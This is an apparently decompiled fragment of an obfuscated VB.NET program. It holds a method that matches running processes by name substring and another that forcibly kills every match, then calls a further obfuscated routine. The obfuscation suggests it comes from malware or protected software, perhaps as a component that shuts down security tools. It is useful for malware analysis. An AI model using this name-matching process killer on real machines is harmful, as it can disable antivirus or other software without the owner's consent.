Imports System
Imports System.Diagnostics

Namespace frgoWklvEOSV
	' Token: 0x0200001F RID: 31
	Public NotInheritable Class xctUtgFsRkGVFBEL
		' Token: 0x060000D0 RID: 208 RVA: 0x0000EC50 File Offset: 0x0000CE50
		Public Shared Function RNfapZoVNfqwThPb(process_0 As Process, string_0 As String) As Boolean
			Dim flag As Boolean
			Try
				flag = process_0.ProcessName.ToLower().Contains(string_0.ToLower())
			Catch ex As InvalidOperationException
				flag = False
			Catch ex2 As NullReferenceException
				flag = False
			Catch
				flag = False
			End Try
			Return flag
		End Function

		' Token: 0x060000D1 RID: 209 RVA: 0x0000ECB0 File Offset: 0x0000CEB0
		Public Shared Sub mwRnumQnlYxOfki(string_0 As String, string_1 As String)
			For Each process As Process In Process.GetProcesses()
				If xctUtgFsRkGVFBEL.RNfapZoVNfqwThPb(process, string_0.ToLower()) Then
					Try
						process.Kill()
						process.WaitForExit()
						PFruJiQrcriiZ.yQfvyropwD()
					Catch ex As InvalidOperationException
					Catch ex2 As PlatformNotSupportedException
						Exit Try
					Catch
					End Try
				End If
			Next
		End Sub
	End Class
End Namespace
